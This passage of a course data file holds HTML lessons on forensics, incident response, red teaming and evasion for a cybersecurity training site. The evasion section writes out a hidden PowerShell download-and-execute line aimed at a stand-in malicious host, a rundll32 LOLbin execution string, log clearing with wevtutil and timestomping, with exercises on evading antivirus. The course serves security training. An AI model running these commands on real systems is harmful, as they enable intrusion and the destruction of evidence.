                            <p class="pl-6 mb-4">Memory forensics helps identify running processes, network connections, and data stored in memory (e.g., encryption keys, passwords, injected code). Tools like Volatility are commonly used for memory analysis.</p>
                            
                            <p class="pl-6 mb-4"><strong>Common Analysis Techniques:</strong></p>
                            <p class="pl-6 mb-4"><strong>• Process Listing:</strong> Identify active processes at the time of the memory dump.</p>
                            <pre class="pl-6 mb-4"><code>volatility -f memory_dump.raw pslist</code></pre>
                            
                            <p class="pl-6 mb-4"><strong>• Network Connections:</strong> Identify active network connections and listening services.</p>
                            <pre class="pl-6 mb-4"><code>volatility -f memory_dump.raw netscan</code></pre>
                            
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Use Volatility to analyze a memory dump, listing active processes and network connections.</li>
                                <li>Analyze system logs from a compromised machine for evidence of privilege escalation or data exfiltration.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>2.3 Forensic Reporting</strong></p>
                            <p class="pl-6 mb-4">After conducting forensic analysis, a detailed report must be created that summarizes the findings, describes the attack, and provides evidence to support the conclusions. The report should also be written in a way that non-technical stakeholders (e.g., legal teams, executives) can understand.</p>
                            
                            <p class="pl-6 mb-4"><strong>Key Components of a Forensic Report:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Executive Summary:</strong> Provide a high-level overview of the incident, including how the breach occurred and its impact.</li>
                                <li><strong>Timeline of Events:</strong> Create a timeline that traces the attacker’s actions from initial compromise to detection.</li>
                                <li><strong>Evidence:</strong> Include screenshots, log extracts, and forensic artifacts that support your findings.</li>
                                <li><strong>Recommendations:</strong> Provide recommendations for improving security controls and preventing future incidents.</li>
                            </ul>
                        `},
                    {
                        title: 'Part 8: Investigating Network and Host-Based Attacks',
                        content: `
                            <p class="pl-6 mb-4"><strong>3. Investigating Network and Host-Based Attacks</strong></p>
                            
                            <p class="pl-6 mb-4"><strong>3.1 Network-Based Attacks</strong></p>
                            <p class="pl-6 mb-4">Network-based attacks often involve exploiting vulnerabilities in protocols or services to gain unauthorized access, exfiltrate data, or disrupt services.</p>
                            
                            <p class="pl-6 mb-4"><strong>Types of Network Attacks:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>DDoS (Distributed Denial of Service):</strong> Attackers overwhelm the target network with traffic to disrupt its availability.</li>
                                <li><strong>Man-in-the-Middle (MITM):</strong> Attackers intercept and potentially alter traffic between two systems to steal credentials or inject malicious content.</li>
                                <li><strong>Exfiltration via DNS Tunneling:</strong> Attackers hide data exfiltration within DNS requests, bypassing traditional security tools.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>Investigation Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Traffic Analysis:</strong> Use tools like Wireshark or Zeek to capture and analyze network traffic. Look for anomalous traffic patterns, unauthorized IP connections, or DNS tunneling.</li>
                                <li><strong>Firewall and IDS/IPS Logs:</strong> Examine logs for blocked traffic, intrusion alerts, and anomalous connections.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>3.2 Host-Based Attacks</strong></p>
                            <p class="pl-6 mb-4">Host-based attacks target individual machines or systems, aiming to exploit vulnerabilities, steal credentials, or install malware.</p>
                            
                            <p class="pl-6 mb-4"><strong>Types of Host-Based Attacks:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Privilege Escalation:</strong> Attackers exploit vulnerabilities or misconfigurations to gain higher privileges on the system.</li>
                                <li><strong>Fileless Malware:</strong> Malware that resides in memory and does not leave traces on the disk, making it harder to detect.</li>
                                <li><strong>Insider Threats:</strong> Malicious insiders use legitimate access to steal data or sabotage systems.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>Investigation Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>File System Analysis:</strong> Look for newly created or modified files, especially in sensitive directories (e.g., /etc/passwd, C:\\Windows\\System32).</li>
                                <li><strong>Process Analysis:</strong> Use EDR tools to identify suspicious processes or unauthorized software running on the host.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Host-Based Attack Investigation:</strong></li>
                                <ul class="list-disc pl-6 mb-4">
                                    <li>Simulate a privilege escalation attack on a Linux or Windows system.</li>
                                    <li>Investigate the system logs, file modifications, and process listings to track the attacker’s activities.</li>
                                </ul>
                            </ul>
                        `},
                    {
                        title: 'Part 9: Case Studies in Incident Response Scenarios',
                        content: `
                            <p class="pl-6 mb-4"><strong>4. Case Studies in Incident Response Scenarios</strong></p>
                            <p class="pl-6 mb-4">Studying real-world incidents can provide valuable insights into how security teams handle attacks and what lessons can be learned to improve future responses.</p>
                            
                            <p class="pl-6 mb-4"><strong>Case Study 1: Target Data Breach (2013)</strong></p>
                            <p class="pl-6 mb-4"><strong>Incident Overview:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Attackers used credentials stolen from a third-party vendor to breach Target’s network and install malware on point-of-sale (POS) systems.</li>
                                <li>Over 40 million credit card numbers were stolen.</li>
                            </ul>
                            <p class="pl-6 mb-4"><strong>Lessons Learned:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Vendor Security:</strong> Implement strict access controls for third-party vendors and enforce network segmentation to protect sensitive systems.</li>
                                <li><strong>Continuous Monitoring:</strong> Employ continuous monitoring to detect suspicious behavior earlier in the attack chain.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>Case Study 2: Maersk NotPetya Attack (2017)</strong></p>
                            <p class="pl-6 mb-4"><strong>Incident Overview:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>The NotPetya ransomware spread through Maersk’s network via a compromised update mechanism, encrypting critical files and systems globally.</li>
                                <li>Maersk had to rebuild its entire IT infrastructure to recover.</li>
                            </ul>
                            <p class="pl-6 mb-4"><strong>Lessons Learned:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Patch Management:</strong> Keep systems updated with the latest security patches to prevent exploitation of known vulnerabilities.</li>
                                <li><strong>Network Segmentation:</strong> Segregate networks to limit the spread of malware.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>Case Study 3: Equifax Data Breach (2017)</strong></p>
                            <p class="pl-6 mb-4"><strong>Incident Overview:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Attackers exploited a vulnerability in Apache Struts on Equifax’s web servers, leading to the exfiltration of sensitive personal data for 147 million people.</li>
                            </ul>
                            <p class="pl-6 mb-4"><strong>Lessons Learned:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Vulnerability Management:</strong> Patch critical vulnerabilities promptly to prevent exploitation.</li>
                                <li><strong>Data Encryption:</strong> Encrypt sensitive data both at rest and in transit to protect it from exposure.</li>
                            </ul>
                        `},
                    {
                        title: 'Assignment for Week 20',
                        content: `
                            <p class="pl-6 mb-4"><strong>Assignment for Week 20:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Incident Response Simulation:</strong> Simulate a security incident (e.g., malware infection, unauthorized access) and walk through each phase of the incident response lifecycle. Document your actions, tools used, and the results.</li>
                                <li><strong>Forensics Lab:</strong> Collect forensic evidence from a compromised system using tools like FTK Imager and Volatility. Analyze the evidence and write a forensic report detailing your findings and recommendations.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>Additional Reading:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Book:</strong> "Incident Response & Computer Forensics" by Chris Prosise — A comprehensive guide to handling security incidents and conducting digital forensic investigations.</li>
                                <li><strong>NIST SP 800-61:</strong> NIST’s guide to computer security incident handling, providing best practices and procedures for incident response.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>Next Week Preview:</strong></p>
                            <p class="pl-6 mb-4">Next week, we will begin <strong>Red Teaming and Advanced Offensive Security</strong>, where we’ll dive into adversary emulation techniques, planning and executing red team engagements, and developing advanced evasion strategies.</p>
                        `}
                    ],
                    videoUrl: '',
                    commands: [],
                    content: ''      
                },
                {   
                    id: "module-11",
                    title: 'Module 11 - Red Teaming and Advanced Offensive Security ',
                    icon: Shield,
                    sections: [
                        {
                            title: 'Week 1: Red Teaming Concepts and Methodologies',
                            content: `
                                <p class="pl-6 mb-4"><strong>Week 21: Red Teaming Concepts and Methodologies</strong></p>
                                <p class="pl-6 mb-4">In this module, we will dive into Red Teaming—the practice of simulating adversary actions to test the effectiveness of an organization’s defense capabilities. Unlike penetration testing, which focuses on finding vulnerabilities, red teaming mimics sophisticated attack strategies to challenge an organization’s detection, response, and mitigation efforts. We will explore the differences between Red Team, Blue Team, and Purple Team, discuss how to plan and execute a red team engagement, and learn how to emulate adversaries using Tactics, Techniques, and Procedures (TTPs). Finally, the hands-on lab will simulate Advanced Persistent Threats (APTs) to demonstrate real-world red team scenarios.</p>
                                
                                <p class="pl-6 mb-4"><strong>Topics Covered:</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li>Red Team vs. Blue Team vs. Purple Team.</li>
                                    <li>Planning and executing a red team engagement.</li>
                                    <li>Adversary emulation using Tactics, Techniques, and Procedures (TTPs).</li>
                                    <li>Hands-on labs: Simulating Advanced Persistent Threats (APTs).</li>
                                </ul>
                                
                                <p class="pl-6 mb-4"><strong>1. Red Team vs. Blue Team vs. Purple Team</strong></p>
                                <p class="pl-6 mb-4">The field of offensive security and defense is structured into Red Teams, Blue Teams, and Purple Teams, each playing a distinct role in improving an organization's security posture.</p>
                                
                                <p class="pl-6 mb-4"><strong>1.1 Red Team</strong></p>
                                <p class="pl-6 mb-4">The Red Team simulates the tactics, techniques, and procedures (TTPs) of real-world adversaries to test the organization's defenses. The goal is to identify weaknesses that could be exploited by an attacker, often using advanced, stealthy techniques that go beyond typical vulnerability scanning.</p>
                                <p class="pl-6 mb-4"><strong>Objectives:</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Attack Simulation:</strong> Mimic realistic cyberattacks, including phishing, social engineering, lateral movement, and data exfiltration.</li>
                                    <li><strong>Challenge Blue Team Defenses:</strong> Test the ability of the Blue Team to detect and respond to attacks.</li>
                                    <li><strong>Persistence and Evasion:</strong> Emphasize stealth and persistence to remain undetected by defenders.</li>
                                </ul>
                                
                                <p class="pl-6 mb-4"><strong>1.2 Blue Team</strong></p>
                                <p class="pl-6 mb-4">The Blue Team is responsible for defending the organization's assets. Their goal is to detect, respond, and mitigate security incidents and continuously improve the organization’s defenses.</p>
                                <p class="pl-6 mb-4"><strong>Objectives:</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Monitoring:</strong> Continuously monitor systems and networks for signs of intrusion.</li>
                                    <li><strong>Incident Response:</strong> Respond to security alerts and actively work to contain and eliminate threats.</li>
                                    <li><strong>Defense Improvements:</strong> Strengthen defenses by applying patches, updating rules, and conducting regular security assessments.</li>
                                </ul>
                            `},
                    {
                        title: 'Part 1: 1.3 Purple Team & 2. Planning and Executing a Red Team Engagement',
                        content: `
                            <p class="pl-6 mb-4"><strong>1.3 Purple Team</strong></p>
                            <p class="pl-6 mb-4">The Purple Team bridges the gap between the Red Team and Blue Team, facilitating collaboration between the offensive and defensive teams. The goal is to enhance the effectiveness of both teams by sharing knowledge and improving detection and defense strategies.</p>
                            <p class="pl-6 mb-4"><strong>Objectives:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Collaboration:</strong> Facilitate information sharing between Red and Blue Teams to improve detection and defense.</li>
                                <li><strong>Defense Enhancement:</strong> Help the Blue Team enhance detection mechanisms based on insights from Red Team engagements.</li>
                                <li><strong>Continuous Improvement:</strong> Drive iterative improvements in security operations by testing new defense tactics and monitoring their effectiveness.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Team Role Play:</strong></li>
                                <ol class="list-decimal pl-6 mb-4">
                                    <li>Form Red, Blue, and Purple Teams within a simulated environment.</li>
                                    <li>Red Team members will plan and execute an attack, while Blue Team members monitor and respond.</li>
                                    <li>The Purple Team will observe and provide recommendations on improving defenses based on the outcome of the attack.</li>
                                </ol>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>2. Planning and Executing a Red Team Engagement</strong></p>
                            <p class="pl-6 mb-4">A Red Team engagement is a structured simulation of an adversary attack designed to test an organization's defenses. Planning and executing a successful red team operation involves several critical steps.</p>
                
                            <p class="pl-6 mb-4"><strong>2.1 Planning the Red Team Engagement</strong></p>
                
                            <p class="pl-6 mb-4"><strong>1. Defining Objectives</strong></p>
                            <p class="pl-6 mb-4">The first step is to determine the objectives of the engagement. Common objectives include:</p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Testing Incident Response:</strong> Evaluate how well the Blue Team can detect and respond to attacks.</li>
                                <li><strong>Validating Security Controls:</strong> Test the effectiveness of security controls, such as firewalls, SIEM systems, and endpoint protection.</li>
                                <li><strong>Exploiting Vulnerabilities:</strong> Identify and exploit weaknesses in the organization's infrastructure.</li>
                            </ul>
                
                            
                        `},
                        {
                            title:'',
                            content:`<p class="pl-6 mb-4"><strong>2. Scoping and Rules of Engagement (RoE)</strong></p>
                            <p class="pl-6 mb-4">Establish the scope of the engagement, including the assets and systems that are in-scope for the attack. Clearly define the Rules of Engagement (RoE) to avoid disrupting critical business operations or violating legal and ethical boundaries.</p>
                            <p class="pl-6 mb-4"><strong>Key Considerations:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>In-Scope Assets:</strong> Define which systems, applications, and networks are fair targets.</li>
                                <li><strong>Out-of-Scope Assets:</strong> Identify any systems that are off-limits (e.g., production systems).</li>
                                <li><strong>Attack Methods:</strong> Specify allowed techniques (e.g., phishing, social engineering, remote code execution).</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>3. Threat Intelligence and Reconnaissance</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Threat Intelligence:</strong> Use intelligence on common adversaries and attack groups to model your simulation (e.g., APT groups, cybercriminal gangs).</li>
                                <li><strong>Reconnaissance:</strong> Perform OSINT (Open Source Intelligence) gathering to identify publicly available information that could help in the attack.</li>
                            </ul>
                            <p class="pl-6 mb-4"><strong>Tools:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Maltego:</strong> For OSINT and relationship mapping.</li>
                                <li><strong>Shodan:</strong> For finding exposed devices and services.</li>
                            </ul>`
                        },
                    {
                        title: 'Part 2: 2.2 Executing the Red Team Engagement',
                        content: `
                            <p class="pl-6 mb-4"><strong>2.2 Executing the Red Team Engagement</strong></p>
                            
                            <p class="pl-6 mb-4"><strong>1. Initial Access</strong></p>
                            <p class="pl-6 mb-4">The first step in a red team operation is to gain initial access to the target network. This may involve techniques such as:</p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Phishing:</strong> Sending malicious emails with attachments or links to compromise user credentials or drop malware.</li>
                                <li><strong>Exploiting Vulnerabilities:</strong> Identifying and exploiting weaknesses in public-facing applications or infrastructure.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>Tools:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Phishing Frameworks:</strong> GoPhish, Social Engineer Toolkit (SET) for executing phishing campaigns.</li>
                                <li><strong>Exploitation Frameworks:</strong> Metasploit, Cobalt Strike for exploiting known vulnerabilities.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>2. Privilege Escalation and Lateral Movement</strong></p>
                            <p class="pl-6 mb-4">Once inside the network, the red team focuses on escalating privileges and moving laterally across systems.</p>
                            <p class="pl-6 mb-4"><strong>Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Credential Dumping:</strong> Use tools like Mimikatz to extract credentials from compromised systems.</li>
                                <li><strong>Lateral Movement:</strong> Move from one system to another using Pass-the-Hash, SMB Relay, or Remote Desktop Protocol (RDP).</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>3. Persistence and Data Exfiltration</strong></p>
                            <p class="pl-6 mb-4">To simulate a long-term attack, the red team establishes persistence on the network (e.g., creating scheduled tasks or modifying registry keys). The final step is to exfiltrate sensitive data without being detected.</p>
                            <p class="pl-6 mb-4"><strong>Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Data Exfiltration:</strong> Use DNS tunneling, encrypted channels, or cloud services to stealthily exfiltrate data.</li>
                                <li><strong>Persistence:</strong> Use tools like Cobalt Strike for maintaining access to compromised systems.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Red Team Attack Simulation:</strong></li>
                                <ol class="list-decimal pl-6 mb-4">
                                    <li>Set up a target network and plan a full attack using the techniques covered (e.g., phishing, privilege escalation, lateral movement).</li>
                                    <li>Execute the attack while trying to evade detection by the Blue Team.</li>
                                </ol>
                            </ul>
                        `},
                    {
                        title: 'Part 3: 3. Adversary Emulation using Tactics, Techniques, and Procedures (TTPs)',
                        content: `
                            <p class="pl-6 mb-4"><strong>3. Adversary Emulation using Tactics, Techniques, and Procedures (TTPs)</strong></p>
                            <p class="pl-6 mb-4">Adversary emulation involves replicating the behavior of real-world attackers, using their Tactics, Techniques, and Procedures (TTPs) to model sophisticated attack scenarios.</p>
                
                            <p class="pl-6 mb-4"><strong>3.1 Tactics, Techniques, and Procedures (TTPs)</strong></p>
                            <p class="pl-6 mb-4">TTPs describe how adversaries operate:</p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Tactics:</strong> The high-level objectives that attackers aim to achieve (e.g., initial access, lateral movement).</li>
                                <li><strong>Techniques:</strong> Specific methods used to achieve a tactic (e.g., spear-phishing, exploiting vulnerabilities).</li>
                                <li><strong>Procedures:</strong> The exact steps attackers take to execute a technique (e.g., using a specific tool to dump credentials).</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Framework: MITRE ATT&CK</strong></p>
                            <p class="pl-6 mb-4">The MITRE ATT&CK framework is a valuable resource for adversary emulation. It provides a comprehensive matrix of TTPs used by various APTs and cybercriminal groups, which can be leveraged for red team simulations.</p>
                
                            <p class="pl-6 mb-4"><strong>Example Techniques from MITRE ATT&CK:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Tactic:</strong> Initial Access (TA0001) <br /><strong>Technique:</strong> Phishing (T1566) <br /><strong>Procedure:</strong> Sending spear-phishing emails with malicious attachments.</li>
                                <li><strong>Tactic:</strong> Credential Access (TA0006) <br /><strong>Technique:</strong> Pass-the-Hash (T1550.002) <br /><strong>Procedure:</strong> Using Mimikatz to harvest NTLM hashes and reuse them to access other systems.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Adversary Emulation Lab:</strong></li>
                                <ol class="list-decimal pl-6 mb-4">
                                    <li>Choose a known APT group from the MITRE ATT&CK framework (e.g., APT29, FIN7).</li>
                                    <li>Emulate their TTPs in a red team engagement, using tools like Cobalt Strike or Empire to execute specific attack techniques.</li>
                                </ol>
                            </ul>
                        `},
                    {
                        title: 'Part :4. Hands-on Labs: Simulating Advanced Persistent Threats (APTs)',
                        content: `
                            <p class="pl-6 mb-4"><strong>4. Hands-on Labs: Simulating Advanced Persistent Threats (APTs)</strong></p>
                            <p class="pl-6 mb-4">In this lab, you will simulate an Advanced Persistent Threat (APT) attack, mimicking the behavior of a sophisticated, stealthy attacker. APTs typically seek long-term access to the target network and employ advanced tactics to avoid detection.</p>
                
                            <p class="pl-6 mb-4"><strong>Lab Overview:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Scenario:</strong> You are tasked with simulating an attack by an APT group, targeting an organization’s internal network. Your goal is to gain initial access, escalate privileges, move laterally, and exfiltrate sensitive data without being detected.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Lab Steps:</strong></p>
                
                            <p class="pl-6 mb-4"><strong>Step 1: Initial Reconnaissance and Access</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Use OSINT tools (e.g., Recon-ng, Shodan) to gather information on the target’s exposed services.</li>
                                <li>Launch a phishing campaign using GoPhish to compromise user credentials or deliver malware.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Step 2: Privilege Escalation and Lateral Movement</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>After initial compromise, use Mimikatz to extract passwords or hashes from memory.</li>
                                <li>Move laterally across systems using Pass-the-Hash or SMB Relay attacks.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Step 3: Establish Persistence</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Establish persistence by creating scheduled tasks, modifying startup scripts, or installing backdoors using Cobalt Strike.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Step 4: Data Exfiltration</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Use DNS tunneling or encrypted channels to exfiltrate sensitive data (e.g., customer records, financial data) without triggering detection by the Blue Team.</li>
                                <li>Monitor the network for signs of detection and evade by clearing logs or encrypting outbound traffic.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>APT Simulation Lab:</strong></li>
                                <ol class="list-decimal pl-6 mb-4">
                                    <li>Execute a full-scale APT simulation, performing each stage of the attack from initial access to data exfiltration.</li>
                                    <li>Document how the attack was carried out, the tools used, and the techniques employed to remain undetected.</li>
                                </ol>
                            </ul>
                        `},
                    {
                        title: 'Assignment for Week 1',
                        content: `
                            <p class="pl-6 mb-4"><strong>Assignment for Week 21:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Red Team Engagement Report:</strong> Plan and execute a simulated red team engagement, detailing the attack vectors, tools, and techniques used. Include a report summarizing the findings, attack paths, and recommendations for improving defenses.</li>
                                <li><strong>MITRE ATT&CK Lab:</strong> Choose a known adversary from the MITRE ATT&CK framework and emulate their tactics in a simulated network environment. Write a report on how the adversary’s techniques were executed and detected.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Additional Reading:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Book:</strong> "Red Team: How to Succeed By Thinking Like the Enemy" by Micah Zenko — A book that explores red team thinking and the strategies behind offensive security.</li>
                                <li><strong>MITRE ATT&CK Framework:</strong> A comprehensive resource for learning adversary TTPs and building emulation scenarios.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Next Week Preview:</strong></p>
                            <p class="pl-6 mb-4">Next week, we will explore Evasion Techniques and Countermeasures, where we’ll learn advanced methods for evading detection during red team operations and how to counter those techniques in a Blue Team context.</p>
                        `},
                    {
                        title: 'Week 2 Evasion Techniques and Countermeasures',
                        content: `
                            <p class="pl-6 mb-4"><strong>Part 1: Evasion Techniques and Countermeasures</strong></p>
                            <p class="pl-6 mb-4">In this module, we will explore advanced evasion techniques used by attackers to bypass security mechanisms and remain undetected. These techniques are critical for Red Team operations, allowing attackers to evade antivirus (AV), Endpoint Detection and Response (EDR), and network security devices like firewalls and IDS/IPS systems. On the defense side, we will also focus on countermeasures Blue Teams can implement to detect and mitigate these evasion attempts. The module concludes with real-world case studies of successful evasion techniques and their defenses.</p>
                    
                            <p class="pl-6 mb-4"><strong>Topics Covered:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Anti-forensics and stealth techniques.</li>
                                <li>Bypassing antivirus and endpoint detection systems.</li>
                                <li>Evasion of network security devices (Firewalls, IDS/IPS).</li>
                                <li>Real-world case studies of evasion techniques and countermeasures.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>1. Anti-Forensics and Stealth Techniques</strong></p>
                            <p class="pl-6 mb-4">Attackers often use anti-forensics techniques to remove traces of their activities and avoid detection during and after an attack. These methods help them to maintain long-term access and frustrate forensic analysis.</p>
                    
                            <p class="pl-6 mb-4"><strong>1.1 Data Obfuscation and Encryption</strong></p>
                            <p class="pl-6 mb-4">Obfuscation techniques are used to hide malicious code, making it difficult for defenders to detect or analyze malware.</p>
                    
                            <p class="pl-6 mb-4"><strong>Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Encryption of Payloads:</strong> Attackers often encrypt malware payloads to prevent detection by antivirus or EDR solutions. The decryption occurs only when the malware is executed.</li>
                                <li><strong>Packer and Crypters:</strong> Tools that wrap malware in layers of encryption or compression to bypass AV and EDR detection. 
                                    <br><strong>Example Tools:</strong> UPX (Ultimate Packer for Executables), Themida, custom crypters.
                                </li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <p class="pl-6 mb-4"><strong>Use a Packer to Evade AV:</strong></p>
                            <ol class="pl-6 mb-4">
                                <li>Wrap a malicious payload in a UPX packer and test its detection against antivirus solutions.</li>
                                <li>Use VirusTotal to analyze how well the packed payload evades detection.</li>
                            </ol>
                        `},
                    {
                        title: 'Part :2 Timestomping and Log Manipulation',
                        content: `
                            <p class="pl-6 mb-4"><strong>1.2 Timestomping and Log Manipulation</strong></p>
                            <p class="pl-6 mb-4">Timestomping and log manipulation techniques are used to alter or delete evidence that attackers were ever present in a system, making forensic investigation difficult.</p>
                    
                            <p class="pl-6 mb-4"><strong>Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Timestomping:</strong> Modifying the creation, modification, and access times of files to hide the true timeline of the attack.
                                    <br><strong>Tool:</strong> Timestomp (part of Metasploit).
                                    <br><code class="pl-6 mb-4">timestomp file.txt -m "01/01/2020 12:00:00"</code>
                                </li>
                                <li><strong>Log Deletion/Modification:</strong> Attackers may delete or alter system logs to erase evidence of their actions.
                                    <br><strong>Tool:</strong> Use built-in tools like wevtutil on Windows to clear event logs.
                                    <br><code class="pl-6 mb-4">wevtutil cl System</code>
                                </li>
                            </ul>
                    
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <p class="pl-6 mb-4"><strong>Timestomping and Log Clearing:</strong></p>
                            <ol class="pl-6 mb-4">
                                <li>Modify the timestamps of files on a compromised system to hide malicious activity.</li>
                                <li>Clear event logs using wevtutil and verify that the activity has been hidden from forensic analysis.</li>
                            </ol>
                
                            <p class="pl-6 mb-4"><strong>2. Bypassing Antivirus and Endpoint Detection Systems</strong></p>
                            <p class="pl-6 mb-4">One of the primary goals for attackers is to bypass antivirus (AV) and Endpoint Detection and Response (EDR) systems. This is often done through code obfuscation, fileless attacks, and living off the land (LoL) techniques that blend malicious activity with legitimate system processes.</p>
                    
                            <p class="pl-6 mb-4"><strong>2.1 Obfuscating Code and Payloads</strong></p>
                            <p class="pl-6 mb-4">Obfuscation involves hiding the true intent of code by making it difficult to analyze. This can include encoding, encrypting, or modifying payloads so that they appear harmless to AV and EDR.</p>
                    
                            <p class="pl-6 mb-4"><strong>Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Custom Payloads:</strong> Writing custom payloads instead of using common frameworks (e.g., Metasploit) to avoid signature-based detection.</li>
                                <li><strong>Base64 Encoding:</strong> Encoding payloads to evade AV heuristics.
                                    <br><code class="pl-6 mb-4">echo "payload" | base64</code>
                                </li>
                                <li><strong>Shellcode Injection:</strong> Using shellcode to inject malicious code directly into the memory of a running process, bypassing file-based detection.</li>
                            </ul>
                    
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <p class="pl-6 mb-4"><strong>Create a Custom Payload:</strong></p>
                            <ol class="pl-6 mb-4">
                                <li>Generate a Metasploit payload and encode it using Base64.</li>
                                <li>Test the payload against an AV/EDR solution to determine if it is detected.</li>
                            </ol>
                        ` },
                    {
                        title: 'Part :3  Fileless Malware and Living off the Land (LoL)',
                        content: `
                            <p class="pl-6 mb-4"><strong>2.2 Fileless Malware and Living off the Land (LoL)</strong></p>
                            <p class="pl-6 mb-4">Fileless malware operates entirely in memory without writing files to disk, making it harder for traditional AV to detect. Living off the Land refers to attackers using legitimate system tools to execute malicious activities, reducing the need for downloading external malware.</p>
                    
                            <p class="pl-6 mb-4"><strong>Fileless Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>PowerShell:</strong> Use PowerShell scripts to execute malicious code directly in memory.
                                    <br><strong>Example:</strong> Execute a PowerShell command to download and run a script from a remote server without touching the disk.
                                    <br><code class="pl-6 mb-4">powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.url/script.ps1')" </code>
                                </li>
                                <li><strong>LOLbins (Living off the Land Binaries):</strong> Attackers use built-in system tools (e.g., mshta.exe, rundll32.exe) to perform malicious activities.
                                    <br><strong>Example:</strong> Using rundll32.exe to run malicious code.
                                    <br><code class="pl-6 mb-4">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();malicious_code_here</code>
                                </li>
                            </ul>
                    
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <p class="pl-6 mb-4"><strong>Fileless Attack Simulation:</strong></p>
                            <ol class="pl-6 mb-4">
                                <li>Use PowerShell to execute a script entirely in memory and bypass disk-based detection.</li>
                                <li>Use a LOLbin such as rundll32.exe to execute a malicious payload on a target system.</li>
                            </ol>
                
                            <p class="pl-6 mb-4"><strong>3. Evasion of Network Security Devices (Firewalls, IDS/IPS)</strong></p>
                            <p class="pl-6 mb-4">Attackers use various techniques to evade network security devices like firewalls, Intrusion Detection Systems (IDS), and Intrusion Prevention Systems (IPS), which are designed to monitor network traffic for suspicious activity.</p>
                    
